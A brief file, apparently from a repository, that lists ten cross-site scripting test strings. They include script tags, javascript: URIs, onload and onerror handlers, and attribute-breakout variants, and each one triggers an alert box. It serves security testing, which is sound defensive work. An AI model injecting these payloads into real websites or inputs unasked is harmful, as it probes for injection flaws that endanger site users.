# alerts-v2-security

A list of XSS test strings. 

security tests
XSS examples:
```html
<script>alert("XSS");</script>
<img src="javascript:alert('XSS');">
<svg/onload=alert('XSS')>
<a href="javascript:alert('XSS')">click me</a>
"><script>alert('XSS');</script>
<script>alert(String.fromCharCode(88,83,83));</script>
<img src=x onerror="alert('XSS')">
<img src=x:x onerror="alert('XSS')">
<iframe src="javascript:alert('XSS');"></iframe>
"><img src=x onerror="alert('XSS')">
```
